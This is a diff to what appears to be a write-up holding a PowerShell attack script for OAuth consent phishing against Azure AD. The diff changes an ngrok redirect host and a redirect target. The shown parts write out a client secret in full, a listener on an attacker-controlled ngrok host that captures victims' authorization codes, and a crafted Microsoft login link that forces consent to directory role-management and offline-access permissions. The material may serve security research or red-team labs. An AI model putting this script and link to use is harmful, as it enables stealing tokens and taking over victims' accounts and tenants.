@@ -165,7 +165,7 @@ $clientId = "675c27b6-e1ff-4a2c-924e-701186f97951"
 $clientSecret = "eV68Q~WEECCIzSJKzATfkd2rly.Kxds1SFzNDbyg"
 $tenantId = "5dc7e152-c906-4d95-bd1a-bcf75eb3e939"
 $OriginalUrl = "https://malicious-web-app.azurewebsites.net/.auth/login/aad/callback"
-$redirectUri = "https://b9e6-152-115-163-102.ngrok-free.app"  # The url that server should redirect to
+$redirectUri = "https://33cf-152-115-163-102.ngrok-free.app"  # The url that server should redirect to
 
 
 
@@ -216,7 +216,7 @@ if ($authCode) {
     }
     # Perform the redirect using HTTP 302
     $response.StatusCode = 302  # HTTP 302 Found (Redirect)
-    $response.Headers.Add("Location", $finalRedirectUrl)
+    $response.Headers.Add("Location", $OriginalUrl)
     $response.OutputStream.Close()
     $response.Close()
     
@@ -229,7 +229,7 @@ $listener.Stop()
 
 ```
 
-https://login.microsoftonline.com/5dc7e152-c906-4d95-bd1a-bcf75eb3e939/oauth2/v2.0/authorize?client_id=675c27b6-e1ff-4a2c-924e-701186f97951&response_type=code&redirect_uri=https://b9e6-152-115-163-102.ngrok-free.app&&scope=User.ReadWrite%20RoleManagement.ReadWrite.Directory%20offline_access&response_mode=query&prompt=consent
+https://login.microsoftonline.com/5dc7e152-c906-4d95-bd1a-bcf75eb3e939/oauth2/v2.0/authorize?client_id=675c27b6-e1ff-4a2c-924e-701186f97951&response_type=code&redirect_uri=https://33cf-152-115-163-102.ngrok-free.app&&scope=User.ReadWrite%20RoleManagement.ReadWrite.Directory%20offline_access&response_mode=query&prompt=consent
 **use `ngrok http 5000` to start the server
 and Remember to update the url address both in the script and the link**
 
